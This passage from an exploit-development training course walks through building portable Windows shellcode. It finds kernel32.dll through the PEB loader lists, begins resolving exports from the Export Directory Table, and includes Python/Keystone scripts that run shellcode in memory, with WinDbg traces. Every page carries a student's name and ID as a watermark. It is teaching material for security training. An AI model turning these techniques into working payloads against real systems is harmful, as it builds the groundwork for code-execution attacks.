them as part of our shellcode in order to perform specific tasks. 
Fortunately, kernel32.dll exposes functions that can be used to accomplish both of these tasks, 
and is likely to be mapped into the process space.206 
Remember, we’re avoiding the use of hard-coded function addresses to ensure 
our shellcode is portable across different Windows versions. 
The 
LoadLibraryA207 
function 
implements 
the 
mechanism 
to 
load 
DLLs, 
while 
GetModuleHandleA208 can be used to get the base address of an already-loaded DLL. Afterward, 
GetProcAddress209 can be used to resolve symbols. 
Unfortunately, the memory addresses of LoadLibrary and GetProcAddress are not automatically 
known to us when we want to execute our shellcode in memory. 
For our shellcode to work, we will need to find another way to obtain the base address of 
kernel32.dll. Then, we’ll have to figure out how to resolve various function addresses from 
kernel32.dll and any other required DLLs. Finally, we will learn how to invoke our resolved 
functions to achieve various results, such as a reverse shell. 
7.3 Finding kernel32.dll 
First, our shellcode needs to locate the base address of kernel32.dll. As we mentioned earlier, we 
need to start with this DLL because it contains all APIs required to load additional DLLs and 
resolve functions within them, namely LoadLibrary and GetProcAddress. 
To obtain the base address of a DLL, we need to ensure that it is mapped within the same 
memory space as our running shellcode. Fortunately, kernel32.dll is almost guaranteed to be 
loaded because it exports core APIs required for most processes, which will significantly increase 
the portability of our shellcode. 
 
206 An exception is when the exploited executable is statically linked. 
207 (Microsoft - LoadLibraryA), https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya 
208 (Microsoft - GetModuleHandleA), https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-
getmodulehandlea 
209 (Microsoft - GetProcAddress), https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
236 
Once we obtain the base address of kernel32.dll and can resolve its exported functions, we’ll be 
able to load additional DLLs using LoadLibraryA and leverage GetProcAddress to resolve functions 
within them. 
There are several methods that can be used to find the kernel32.dll base address. We’ll cover the 
most commonly-used method, which relies on the Process Environmental Block (PEB) structure. 
Two other techniques, the Structured Exception Handler (SEH)210 and the “Top Stack” method,211 
are less portable and will not work on modern versions of Windows. 
7.3.1 PEB Method 
One of the most reliable techniques for determining the kernel32.dll base address involves 
parsing the PEB. 
The PEB structure is allocated by the operating system for every running process. We can find it 
by traversing the process memory starting at the address contained in the FS register. On 32-bit 
versions of Windows, the FS register always contains a pointer to the current Thread Environment 
Block (TEB).212 The TEB is a data structure that stores information about the currently-running 
thread. At offset 0x30 from the beginning of the TEB, we will find a pointer to the PEB data 
structure. 
Let’s inspect the various structures that our shellcode will use. To get started, we can run 
Notepad, attach WinDbg to it, and dump the TEB structure. 
0:002> dt nt!_TEB @$teb 
ntdll!_TEB 
   +0x000 NtTib            : _NT_TIB 
   +0x01c EnvironmentPointer : (null)  
   +0x020 ClientId         : _CLIENT_ID 
   +0x028 ActiveRpcHandle  : (null)  
   +0x02c ThreadLocalStoragePointer : (null)  
   +0x030 ProcessEnvironmentBlock : 0x7f60b000 _PEB 
   +0x034 LastErrorValue   : 0 
   +0x038 CountOfOwnedCriticalSections : 0 
... 
Listing 272 - Gathering a pointer to the PEB structure through the Thread Environment Block 
Listing 272 shows that at offset 0x30 we have a pointer to the PEB structure. We can collect a 
variety of information from the PEB, including the image name, process startup arguments, 
process heaps, and more. 
0:002> dt nt!_PEB 0x7f60b000 
ntdll!_PEB 
   +0x000 InheritedAddressSpace : 0 '' 
   +0x001 ReadImageFileExecOptions : 0 '' 
   +0x002 BeingDebugged    : 0x1 '' 
   +0x003 BitField         : 0x4 '' 
   +0x003 ImageUsesLargePages : 0y0 
 
210 (Understanding Windows Shellcode), http://index-of.es/Exploit/Understanding%20Windows%20Shellcode.pdf 
211 (Win32 Assembly Components), http://www.offensive-security.com/AWEPAPERS/winasm-1.0.1.pdf 
212 (Win32 Thread Information Block), https://en.wikipedia.org/wiki/Win32_Thread_Information_Block 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
237 
   +0x003 IsProtectedProcess : 0y0 
   +0x003 IsImageDynamicallyRelocated : 0y1 
   +0x003 SkipPatchingUser32Forwarders : 0y0 
   +0x003 IsPackagedProcess : 0y0 
   +0x003 IsAppContainer   : 0y0 
   +0x003 IsProtectedProcessLight : 0y0 
   +0x003 SpareBits        : 0y0 
   +0x004 Mutant           : 0xffffffff Void 
   +0x008 ImageBaseAddress : 0x00230000 Void 
   +0x00c Ldr              : 0x776c9aa0 _PEB_LDR_DATA 
... 
Listing 273 - Gathering a pointer to the _PEB_LDR_DATA structure through the PEB 
What’s most important to us is the pointer to the _PEB_LDR_DATA structure, located at offset 
0x0C inside the PEB. This pointer references three linked lists revealing the loaded modules that 
have been mapped into the process memory space. 
Let’s inspect the _PEB_LDR_DATA structure in WinDbg to collect more information on the three 
doubly-linked lists. 
0:002> dt _PEB_LDR_DATA 0x776c9aa0 
ntdll!_PEB_LDR_DATA 
   +0x000 Length           : 0x30 
   +0x004 Initialized      : 0x1 '' 
   +0x008 SsHandle         : (null)  
   +0x00c InLoadOrderModuleList : _LIST_ENTRY [ 0x4011728 - 0x40180d0 ] 
   +0x014 InMemoryOrderModuleList : _LIST_ENTRY [ 0x4011730 - 0x40180d8 ] 
   +0x01c InInitializationOrderModuleList : _LIST_ENTRY [ 0x4011658 - 0x40180e0 ] 
   +0x024 EntryInProgress  : (null)  
   +0x028 ShutdownInProgress : 0 '' 
   +0x02c ShutdownThreadId : (null)  
Listing 274 - Gathering the InInitializationOrderModuleList list through the _PEB_LDR_DATA structure 
In Listing 274, we find three linked lists with descriptive names, each of which offers a different 
ordering of the loaded modules: 
• 
InLoadOrderModuleList shows the previous and next module in load order. 
• 
InMemoryOrderModuleList shows the previous and next module in memory placement order. 
• 
InInitializationOrderModuleList shows the previous and next module in initialization order. 
WinDbg describes InInitializationOrderModuleList as a LIST_ENTRY structure composed of two 
fields: 
0:002> dt _LIST_ENTRY (0x776c9aa0 + 0x1c) 
ntdll!_LIST_ENTRY 
 [ 0x4011658 - 0x40180e0 ] 
   +0x000 Flink            : 0x04011658 _LIST_ENTRY [ 0x4011d88 - 0x776c9abc ] 
   +0x004 Blink            : 0x040180e0 _LIST_ENTRY [ 0x776c9abc - 0x40188c0 ] 
Listing 275 - Dumping the _LIST_ENTRY structure in WinDbg 
The Flink and Blink fields are commonly used in doubly-linked lists to access the next (Flink) or 
previous (Blink) entry in the list. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
238 
This information might not seem helpful at first, but the _LIST_ENTRY structure indicated in the 
_PEB_LDR_DATA 
is 
embedded 
as 
part 
of 
a 
larger 
structure 
of 
type 
_LDR_DATA_TABLE_ENTRY_.213 The following listing shows the _LDR_DATA_TABLE_ENTRY_ 
structure in WinDbg. 
0:002> dt _LDR_DATA_TABLE_ENTRY (0x04011658 - 0x10) 
ntdll!_LDR_DATA_TABLE_ENTRY 
   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x4011ab0 - 0x4011728 ] 
   +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x4011ab8 - 0x4011730 ] 
   +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x4011d88 - 0x776c9abc ] 
   +0x018 DllBase          : 0x775c0000 Void 
   +0x01c EntryPoint       : (null)  
   +0x020 SizeOfImage      : 0x17a000 
   +0x024 FullDllName      : _UNICODE_STRING "C:\Windows\SYSTEM32\ntdll.dll" 
   +0x02c BaseDllName      : _UNICODE_STRING "ntdll.dll" 
   +0x034 FlagGroup        : [4]  "???" 
   +0x034 Flags            : 0xa2c4 
... 
Listing 276 - Dumping the LDR_DATA_TABLE_ENTRY structure inside WinDbg 
When dumping the structure we subtract the value 0x10 from the address of the _LIST_ENTRY 
structure in order to reach the beginning of the _LDR_DATA_TABLE_ENTRY_ structure. 
Furthermore, Listing 276 shows that the structure contains a field called DllBase. As the name 
suggests, this field holds the DLL’s base address. We can also obtain the name of the DLL using 
the BaseDllName field. According to the WinDbg output, this field contains a nested structure of 
_UNICODE_STRING214 type. 
The official documentation states that the _UNICODE_STRING structure has a Buffer member 
starting at offset 0x04 from the beginning of this structure, which contains a pointer to a string of 
characters. This means that, for the purpose of our shellcode, the DLL name starts at offset 0x30 
from the beginning of the _LDR_DATA_TABLE_ENTRY_ structure. 
Using the structures from this section, we can effectively parse the InInitializationOrderModuleList 
doubly-linked list and use the BaseDllName field to find our desired module. Once we find a 
matching name, we can gather the base address from DllBase. 
7.3.1.1 Exercises 
1. 
Open Notepad and attach to it using WinDbg. 
2. 
Using WinDbg, dump the structures listed in this section and make sure you understand the 
link between them and how they can be used to obtain the base address of a module. 
7.3.2 Assembling the Shellcode 
With the important structures used to retrieve the base address of a loaded module covered, let’s 
begin assembling our shellcode. 
 
213 “The Rootkit Arsenal: Escape and Evasion in the Dark Corners of the System”, Page 448. 
214 (Microsoft- UNICODE_STRING structure), https://docs.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_unicode_string 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
239 
We will use the Keystone Framework in order to assemble our shellcode on the fly. We will also 
use the CTypes215 Python library, which will help us run this code directly in the memory space of 
the python.exe process using a number of Windows APIs. This will make the debugging process 
of our shellcode much easier. 
Our Python script will essentially use the Keystone Engine and CTypes to: 
• 
Transform our ASM code into opcodes using the Keystone framework. 
• 
Allocate a chunk of memory for our shellcode. 
• 
Copy our shellcode to the allocated memory. 
• 
Execute the shellcode from the allocated memory. 
We will create a Python script that executes the steps detailed above and uses the PEB technique 
to retrieve the base address of kernel32.dll. 
We will go through the logic of the Python code to better understand how it works. Then, we’ll 
examine our shellcode’s assembly instructions. 
Our code starts by importing the required libraries and defining a CODE variable which will shortly 
be used to store our assembly code. 
import ctypes, struct 
from keystone import * 
 
CODE = ( 
 
) 
Listing 277 - Importing libraries and defining the CODE variable 
Next, we’ll initialize the Keystone engine in 32-bit mode. 
... 
) 
 
# Initialize engine in X86-32bit mode 
ks = Ks(KS_ARCH_X86, KS_MODE_32) 
Listing 278 - Initializing the Keystone engine in 32-bit mode 
We can invoke the asm method to compile our instructions that we will then store in the shellcode 
variable as a byte array. 
... 
encoding, count = ks.asm(CODE) 
print("Encoded %d instructions..." % count) 
 
sh = b"" 
for e in encoding: 
    sh += struct.pack("B", e) 
shellcode = bytearray(sh) 
Listing 279 - Compiling instructions and storing them as a byte array 
 
215 (ctypes — A foreign function library for Python), https://docs.python.org/3/library/ctypes.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
240 
While the .asm method will produce the opcodes for our shellcode, we would also like to test it 
right away. This is where the CTypes library helps tremendously: 
... 
shellcode = bytearray(sh) 
 
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), 
                                          ctypes.c_int(len(shellcode)), 
                                          ctypes.c_int(0x3000), 
                                          ctypes.c_int(0x40)) 
 
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode) 
 
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), 
                                     buf, 
                                     ctypes.c_int(len(shellcode))) 
Listing 280 - find_kernel32.py: Using CTypes to call Windows APIs from Python 
Once the opcodes of our shellcode are stored as a byte array, we can call VirtualAlloc216 to 
allocate a memory page with PAGE_EXECUTE_READWRITE217 protections. Next, we’ll call 
RtlMoveMemory218 to copy the shellcode opcodes to the newly-allocated memory page. 
... 
print("Shellcode located at address %s" % hex(ptr)) 
input("...ENTER TO EXECUTE SHELLCODE...") 
 
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), 
                                         ctypes.c_int(0), 
                                         ctypes.c_int(ptr), 
                                         ctypes.c_int(0), 
                                         ctypes.c_int(0), 
                                         ctypes.pointer(ctypes.c_int(0))) 
 
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1)) 
Listing 281 - find_kernel32.py: Stopping execution until input and then running our shellcode 
The next line (Listing 281) shows a print statement followed by a Python input().219 This pauses 
the execution until input is received, allowing us to attach WinDbg to the python.exe process. 
Finally, we’ll call CreateThread220 to run the shellcode in a new thread. 
With the functionality of the script covered, let’s start adding the assembly code for our shellcode. 
import ctypes, struct 
from keystone import * 
 
 
216 (Microsoft - VirtualAlloc), https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc 
217 (Microsoft - Memory Protection Constants), https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-
constants 
218 (Microsoft - RtlMoveMemory), https://docs.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory 
219 (Python3 - input), https://docs.python.org/3/library/functions.html#input 
220 (Microsoft - CreateThread),https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-
createthread  
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
241 
CODE = ( 
    " start:                             "  # 
    "   int3                            ;"  #   Breakpoint for Windbg. REMOVE ME WHEN 
NOT DEBUGGING!!!! 
    "   mov   ebp, esp                  ;"  # 
    "   sub   esp, 60h                  ;"  # 
... 
Listing 282 - Inspecting the start function of our shellcode 
The start function of our shellcode begins with an int3 instruction, which we can leverage as a 
software breakpoint to help us with the debugging process. We’ll use this to break right before our 
shellcode, saving us time from printing out the allocated memory address and manually setting 
the breakpoint in our debugger each time we run our script. 
Following the int3 instruction, we’ll move the ESP register to EBP and then subtract a value of 
0x60 from ESP. This sequence effectively emulates an actual function call in which the ESP 
register is moved to EBP so that arguments passed to the function can be easily accessed. We’ll 
subtract an arbitrary offset so that the stack does not get clobbered. 
... 
"   sub   esp, 60h                  ;"  # 
 
    " find_kernel32:                     "  # 
    "   xor   ecx, ecx                  ;"  #   ECX = 0 
    "   mov   esi,fs:[ecx+30h]          ;"  #   ESI = &(PEB) ([FS:0x30]) 
    "   mov   esi,[esi+0Ch]             ;"  #   ESI = PEB->Ldr 
    "   mov   esi,[esi+1Ch]             ;"  #   ESI = PEB->Ldr.InInitOrder 
Listing 283 - Inspecting the find_kernel32 function of our shellcode 
Our code then executes the find_kernel32 function. The first instruction sets the ECX register to 
null. This register is then used with the offset 0x30 in the mov esi, fs:[ecx+0x30] instruction, which 
stores the pointer to the PEB in the ESI register. 
Once the ESI register contains a pointer to the PEB, we dereference it at offset 0x0C to get a 
pointer to the _PEB_LDR_DATA structure and store it in ESI once again. Finally, we dereference 
ESI again, this time at offset 0x1C, to get the InInitializationOrderModuleList entry. 
Then we proceed to the next_module function: 
... 
   "   mov   esi,[esi+1Ch]             ;"  #   ESI = PEB->Ldr.InInitOrder 
     
    " next_module:                      "  # 
    "   mov   ebx, [esi+8h]             ;"  #   EBX = InInitOrder[X].base_address 
    "   mov   edi, [esi+20h]            ;"  #   EDI = InInitOrder[X].module_name 
    "   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next) 
    "   cmp   [edi+12*2], cx            ;"  #   (unicode) modulename[12] == 0x00? 
    "   jne   next_module               ;"  #   No: try next module. 
    "   ret                              "  # 
) 
Listing 284 - Inspecting the next_module function of our shellcode 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
242 
The first two instructions will move the base address of a loaded module to the EBX register and 
the module name to EDI. The third instruction in this function sets ESI to the next 
InInitializationOrderModuleList entry using the Flink member. 
Finally, the comparison instruction that follows is arguably the most important one. Specifically, 
we are comparing the WORD pointed to by edi + 12 * 2 to the CX register, which we previously set 
to NULL. Simply put, we are trying to determine if we have encountered a NULL string terminator 
at index 24 of the module name. 
The reason for this lies in the fact that the length of the “kernel32.dll” string is 12 bytes. Because 
the string is stored in UNICODE format, every character of the string will be represented as a 
WORD rather than a byte, making the length 24 in Unicode. Therefore, if the WORD starting at the 
25th byte is NULL, we have found a string of 12 UNICODE characters. 
If the comparison fails, we’ll take a conditional jump back to next_module and proceed to check 
the next entry until the comparison succeeds. 
Because InInitializationOrderModuleList displays modules based on the order they were initialized, 
the first module name that matches the comparison will always be kernel32.dll, as it is one of the 
first to be initialized. 
Until the release of Windows 7, the kernel32.dll initialization order was always 
constant for all Microsoft operating systems. As a result, the initialization order 
linked list was often used by shellcoders. By walking the list to the second entry, 
the base address for kernel32.dll could be extracted. 
This method became ineffective in Windows 7 and a more universal method221 
was introduced that works on later versions of Windows as well. 
Now that we understand how the shellcode works, let’s try to follow the instructions in WinDbg to 
confirm that we can successfully obtain the base address of kernel32.dll. 
We can run our script to execute everything until input(), where execution will stop until we press 
I: 
C:\Users\offsec\Desktop> python find_kernel32.py 
Encoded 16 instructions... 
Shellcode located at address 0x11e0000 
...ENTER TO EXECUTE SHELLCODE... 
Listing 285 - Running find_kernel32.py 
With the script paused, let’s attach WinDbg to the python.exe process. Once attached, we’ll let the 
application resume execution. Pressing I in our command prompt will take us to the first 
instruction of our shellcode (INT3). 
 
221 (Skypher - Shellcode: finding the base address of kernel32 in Windows 7), http://www.offensive-
security.com/AWEPAPERS/Skypher.pdf 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
243 
0:001> g 
(10d0.f0c): Break instruction exception - code 80000003 (first chance) 
eax=bea7140b ebx=00000000 ecx=011e0000 edx=011e0000 esi=011e0000 edi=011e0000 
eip=011e0000 esp=013ffc9c ebp=013ffcac iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
011e0000 cc              int     3 
 
0:001> u @eip Ld 
011e0000 cc              int     3 
011e0001 89e5            mov     ebp,esp 
011e0003 83ec60          sub     esp,60h 
011e0006 31c9            xor     ecx,ecx 
011e0008 648b7130        mov     esi,dword ptr fs:[ecx+30h] 
011e000c 8b760c          mov     esi,dword ptr [esi+0Ch] 
011e000f 8b761c          mov     esi,dword ptr [esi+1Ch] 
011e0012 8b5e08          mov     ebx,dword ptr [esi+8] 
011e0015 8b7e20          mov     edi,dword ptr [esi+20h] 
011e0018 8b36            mov     esi,dword ptr [esi] 
011e001a 66394f18        cmp     word ptr [edi+18h],cx 
011e001e 75f2            jne     011e0012 
011e0020 c3              ret 
Listing 286 - Reaching the beginning of our shellcode inside WinDbg 
To confirm that our shellcode is running correctly, let’s set a breakpoint at the compare 
instruction and resume the application flow. Once our breakpoint is hit, we’ll inspect the EBX and 
EDI registers to determine the base address and name of the module present in the first 
InInitializationOrderModuleList entry. 
0:001> bp 011e001a  
 
0:001> g 
Breakpoint 0 hit 
eax=bea7140b ebx=77020000 ecx=00000000 edx=011e0000 esi=00f11e60 edi=77026c08 
eip=011e001a esp=013ffc3c ebp=013ffc9c iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
011e001a 66394f18        cmp     word ptr [edi+18h],cx    ds:0023:77026c20=002e 
 
0:001> r @ebx 
ebx=77020000 
 
0:001> du @edi 
77026c08  "ntdll.dll" 
 
0:001> lm m ntdll 
Browse full module list 
start    end        module name 
77020000 7719a000   ntdll      (pdb symbols)          
c:\symbols\ntdll.pdb\FA32EA7CECAA40BA94BF296AC6F178701\ntdll.pdb 
Listing 287 - Inspecting the first entry in the InInitializationOrderModuleList list 
Listing 287 shows the ntdll.dll module as the first entry. Furthermore, we can confirm that the 
base address gathered from the _LDR_DATA_TABLE_ENTRY_ structure is correct. 
Since this module is not the one we are looking for, the conditional jump will be taken, causing us 
to loop over the entries until we find the entry for the kernel32.dll module. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
244 
We can remove all breakpoints to speed up the process and execute the WinDbg pt command, 
which will allow the execution to continue until the next return instruction. This is the last 
instruction in our shellcode that will be executed if the conditional jump is not taken. 
0:001> bc * 
 
0:001> bl 
 
0:001> pt 
eax=bea7140b ebx=76e40000 ecx=00000000 edx=011e0000 esi=00f17930 edi=00f11c90 
eip=011e0020 esp=013ffc3c ebp=013ffc9c iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
011e0020 c3              ret 
 
0:001> r @ebx 
ebx=76e40000 
 
0:001> du @edi 
00f11c90  "KERNEL32.DLL" 
 
0:001> lm m kernel32 
Browse full module list 
start    end        module name 
76e40000 76ed5000   KERNEL32   (pdb symbols)          
c:\symbols\kernel32.pdb\F8E18714F7AC4AD1AC00CC0C6D41DD991\kernel32.pdb 
Listing 288 - Obtaining the base address of kernel32.dll 
Excellent! Listing 288 shows that our shellcode successfully obtained the base address of 
kernel32.dll by parsing the InInitializationOrderModuleList doubly-linked list. 
7.3.2.1 Exercises 
1. 
Take the time to observe how the InInitializationOrderModuleList doubly-linked list works in 
memory. 
2. 
Execute find_kernel32.py on your dedicated Windows 10 machine. 
3. 
Attach WinDbg to python.exe and follow the shellcode execution flow. 
4. 
Follow the shellcode instructions and, using the same memory addresses as the shellcode, 
dump the structures it is accessing inside WinDbg. 
7.4 Resolving Symbols 
Finding the base address of kernel32.dll is a good first step, but our shellcode will crash if we 
continue to execute assembly instructions after the return. This crash occurs because we are not 
doing anything to cleanly exit our shellcode. 
With the address of kernel32.dll gathered, our next step is to resolve various APIs that are 
exported by the module. We’ll start by dynamically resolving the address of TerminateProcess222 
 
222 (Microsoft - Terminate Process), https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-
terminateprocess 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
245 
using the Export Directory Table. Once resolved, the API will enable us to cleanly terminate our 
shellcode. 
Previously, we mentioned that kernel32.dll exports APIs such as GetProcAddress, which will allow 
us to locate various exported functions. The issue is that GetProcAddress also needs to be 
located before it can be used. Rather than relying on this API, most shellcodes will use an 
equivalent to GetProcAddress, which can be achieved by traversing the Export Address Table 
(EAT) of a DLL loaded in memory. To gather a module’s EAT address, we first need to acquire the 
base address of the selected DLL. 
7.4.1 Export Directory Table 
The most reliable way to resolve symbols from kernel32.dll (and other DLLs) is by using the 
Export Directory Table method. 
In this case, the term “symbols” refers to the function names and their starting 
memory addresses. 
Generally, DLLs that export functions have an export directory table that contains important 
information about symbols such as: 
• 
Number of exported symbols. 
• 
Relative Virtual Address (RVA) of the export-functions array. 
• 
RVA of the export-names array. 
• 
RVA of the export-ordinals array. 
The Export Directory Table structure223 contains additional fields, as illustrated below: 
typedef struct _IMAGE_EXPORT_DIRECTORY { 
  DWORD Characteristics; 
  DWORD TimeDateStamp; 
  WORD MajorVersion; 
  WORD MinorVersion; 
  DWORD Name; 
  DWORD Base; 
  DWORD NumberOfFunctions; 
  DWORD NumberOfNames; 
  DWORD AddressOfFunctions; 
  DWORD AddressOfNames; 
  DWORD AddressOfNameOrdinals; 
} 
Listing 289 - The Export Directory Table data structure (IMAGE_EXPORT_DIRECTORY) 
The 
one-to-one 
relationship 
between 
the 
AddressOfFunctions, 
AddressOfNames, 
and 
AddressOfNameOrdinals arrays, which we will cover shortly, is essential for symbol resolution. 
 
223 (ReactOS - _IMAGE_EXPORT_DIRECTORY Struct Reference), 
https://doxygen.reactos.org/d5/db1/dll_2win32_2dbghelp_2compat_8h_source.html#l00145 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
246 
To resolve a symbol by name, let’s begin with the AddressOfNames array. Every name will have a 
unique entry and index in the array. Once we have found the name of the symbol we are looking 
for at index i in the AddressOfNames array, we can use the same index i in the 
AddressOfNameOrdinals array. 
The diagram below provides a graphical example of how this works. We’ll cover the specific 
assembly code shortly. 
 
Figure 67: EAT function VMA 
The entry from the AddressOfNameOrdinals array at index i will contain a value, which will serve 
as a new index that we will use in the AddressOfFunctions array. At this new index, we will find the 
relative virtual memory address of the function. We can translate this address into a fully-
functional Virtual Memory Address (VMA) by adding the base address of the DLL to it. 
Since the size of our shellcode is just as important as its portability, we need to optimize the 
search algorithm for our required symbol names. To do that, we will use a very particular hashing 
function that transforms a string into a four byte hash. This method will allow us to reuse the 
assembly instructions for any given symbol name. 
While we could find alternative methods to parse the AddressOfNames array and 
search for our function, such as checking the string length and comparing 
various parts of the symbol, this method is not scalable for a real-world shellcode 
where we need to call multiple APIs. 
This algorithm produces the same result obtained by the GetProcAddress function mentioned 
earlier and can be used for every DLL. In fact, once the LoadLibraryA symbol has been resolved, 
we can load arbitrary modules and locate the functions needed to build our custom shellcode 
without using GetProcAddress. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
247 
7.4.1.1 Exercise 
1. 
Review the theory of this section and ensure that you understand the relation between the 
three arrays used by the Export Directory Table. You can use the footnotes from this section 
to get a more in-depth view of the structures and offsets used. 
7.4.2 Working with the Export Names Array 
Now that we have covered the relationship between the three arrays in the Export Directory Table 
(EDT), let’s observe how our shellcode will parse it to dynamically resolve symbols. 
The Export Directory Table structure fields contain relative addresses. To obtain the virtual 
memory address, our shellcode will often add the kernel32.dll base address to the RVA, which is 
currently stored in the EBX register. Let’s examine the technique by analyzing the ASM code 
chunk by chunk: 
import ctypes, struct 
from keystone import * 
 
CODE = ( 
    " start:                             "  # 
    "   int3                            ;"  #   Breakpoint for Windbg. REMOVE ME WHEN 
NOT DEBUGGING!!!! 
    "   mov   ebp, esp                  ;"  # 
    "   sub   esp, 0x200                ;"  # 
    "   call  find_kernel32             ;"  # 
    "   call  find_function             ;"  # 
 
    " find_kernel32:                     "  # 
    "   xor   ecx, ecx                  ;"  #   ECX = 0 
... 
    " find_function:                     "  # 
    "   pushad                          ;"  #   Save all registers 
                                            #   Base address of kernel32 is in EBX 
from  
                                            #   Previous step (find_kernel32) 
    "   mov   eax, [ebx+0x3c]           ;"  #   Offset to PE Signature 
    "   mov   edi, [ebx+eax+0x78]       ;"  #   Export Table Directory RVA 
    "   add   edi, ebx                  ;"  #   Export Table Directory VMA 
    "   mov   ecx, [edi+0x18]           ;"  #   NumberOfNames 
    "   mov   eax, [edi+0x20]           ;"  #   AddressOfNames RVA 
    "   add   eax, ebx                  ;"  #   AddressOfNames VMA 
    "   mov   [ebp-4], eax              ;"  #   Save AddressOfNames VMA for later 
 
    " find_function_loop:                "  # 
    "   jecxz find_function_finished    ;"  #   Jump to the end if ECX is 0 
    "   dec   ecx                       ;"  #   Decrement our names counter 
    "   mov   eax, [ebp-4]              ;"  #   Restore AddressOfNames VMA 
    "   mov   esi, [eax+ecx*4]          ;"  #   Get the RVA of the symbol name 
    "   add   esi, ebx                  ;"  #   Set ESI to the VMA of the current 
symbol name 
     
    " find_function_finished:            "  # 
    "   popad                           ;"  #   Restore registers 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
248 
    "   ret                             ;"  # 
... 
Listing 290 - resolving_symbols_0x01.py: Finding the Export Directory Table and AddressOfNames VMAs 
We have modified the start function to accommodate additional space needed to prevent 
clobbering of the stack. The instructions required to find the base address of kernel32.dll have 
been encapsulated into the find_kernel32 function. Additionally, we have introduced three new 
functions called find_function, find_function_loop and find_function_finished which are going to be 
responsible for finding the symbols we require. 
Once we have found the kernel32 base address, we can execute find_function, which first saves 
all the register values on the stack using PUSHAD. This will allow us to restore these values 
cleanly later on, even if our ASM code clobbers the register values during its execution. 
The next step is to store the value pointed to by the EBX register (which holds the base address of 
kernel32.dll) at offset 0x3C in EAX. We know from previous modules that at this offset from the 
beginning of a PE (MS-DOS header) is the offset to the PE header.224 
The following instruction uses the value stored previously in EAX, adds it to the base address of 
kernel32.dll along with a static offset of 0x78, and stores the dereferenced value in EDI. We are 
using the 0x78 offset from the PE header because this is the location where we can find the RVA 
of the Export Directory Table. 
This address is then converted into a VMA by adding it to the base address of kernel32.dll using 
the ADD instruction. Let’s review the relevant instructions for these steps below: 
    " find_function:                     "  # 
    "   pushad                          ;"  #   Save all registers 
                                            #   Base address of kernel32 is in EBX 
from  
                                            #   Previous step (find_kernel32) 
    "   mov   eax, [ebx+0x3c]           ;"  #   Offset to PE Signature 
    "   mov   edi, [ebx+eax+0x78]       ;"  #   Export Table Directory RVA 
    "   add   edi, ebx                  ;"  #   Export Table Directory VMA 
... 
Listing 291 - Obtaining the Export Directory Table 
EDI now contains the virtual memory address of our Export Directory Table. With this in mind, let’s 
move to the next instructions: 
    "   mov   ecx, [edi+0x18]           ;"  #   NumberOfNames 
    "   mov   eax, [edi+0x20]           ;"  #   AddressOfNames RVA 
    "   add   eax, ebx                  ;"  #   AddressOfNames VMA 
    "   mov   [ebp-4], eax              ;"  #   Save AddressOfNames VMA for later 
Listing 292 - Obtaining the AddressOfNames array 
We’ll store the value pointed to by EDI and a static offset of 0x18 into ECX. This is the offset225 to 
